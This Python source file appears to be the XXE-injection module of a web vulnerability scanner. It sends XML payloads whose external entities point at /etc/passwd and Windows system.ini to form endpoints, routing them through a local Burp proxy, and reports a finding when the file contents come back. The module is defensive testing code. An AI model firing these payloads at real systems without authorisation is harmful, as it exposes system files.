import requests
import re

from activeScanRules.activeScanner import ActiveScanner

class ScanXXEInject(ActiveScanner):

    def __init__(self, host_os=None, visited_urls=None, log_file=None):
        super().__init__(visited_urls, log_file)
        self.host_os = host_os

    def initialise_local_file_targets(self):
        linux_local_file_targets = [
            ["file:///etc/passwd", re.compile(r"root:.:0:0")]

        ]
        windows_local_file_targets = [
            ["file:///c:/Windows/system.ini", re.compile(r"^\[drivers]$")],
            ["file:///d:/Windows/system.ini", re.compile(r"^\[drivers]$")]
        ]
        if self.host_os == "unix":
            return linux_local_file_targets
        elif self.host_os == "windows":
            return windows_local_file_targets

    def initialise_xml_message(self):
        """
        <?xml version="1.0"?>
        <!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <test>&xxe;</test>
        """
        xml_header = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<!DOCTYPE test [ \n<!ENTITY xxe SYSTEM \"{payload}\"> \n]>\n")
        xml_body = "<test>" + "&xxe;" + "</test>"
        xml_message = xml_header + xml_body
        return xml_message

    def test_payloads(self, target_url, form_fields):
        potential_vulnerability_found = False

        for target, pattern in self.initialise_local_file_targets():
            try:
                payload = self.initialise_xml_message().format(payload=target)

                self.logger.info(f"\tTesting payload: {payload} on {target_url}")

                response = self.send_request_with_payload(payload, target_url, form_fields)
                if self.check_response(response, payload, target_url, pattern):
                    self.logger.warning(
                        f"\tXXE injection vulnerability found at: {target_url} with payload: {payload}")
                    print(f"\033[31m[+] XXE injection vulnerability found at: {target_url} with payload:\n{payload}")
                    potential_vulnerability_found = True
                    break
                    # After testing all payloads, if no potential vulnerability is found, print the message
            except Exception as e:
                self.logger.error(f"\tAn error occurred while sending form with XXE injection payload to {target_url}: {e}")

        if not potential_vulnerability_found:
            self.logger.info(f"\tNo XXE injection vulnerability found at: {target_url}")
            print(f"\033[32m[+] No xxe injection vulnerability found at: {target_url}\033[0m")


    def send_request_with_payload(self, payload, target_url, form_fields):
        method = form_fields[0][2].upper()
        proxies = {'http': 'http://127.0.0.1:8080',
                   'https': 'http://127.0.0.1:8080'} # for burp testing purposes

        user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/xml'
        }
        response = None
        try:
            if method == "GET":

                xml_field_name, xml_field_type, xml_field_method = form_fields[1]
                submit_button_name, submit_button_type, submit_button_method = form_fields[2]
                response = requests.get(target_url, params={xml_field_name: payload, submit_button_name: submit_button_type}, headers=headers, proxies=proxies) #,
            elif method == "POST":
                response = requests.post(target_url, data=payload, headers=headers, proxies=proxies) #
            return response
        except requests.RequestException as e:
            self.logger.error(f"\tAn error occurred while sending request: {e}")
            return response

    def check_response(self, response, payload, target_url, pattern):
        # Check if response indicates successful injection
        if response.status_code == 200:
            # Check if the response contains common command injection error messages or patterns
            if pattern.search(response.text):
                return True
        else:
            self.logger.error(f"\tUnexpected response code ({response.status_code}) for {target_url}")
        return False


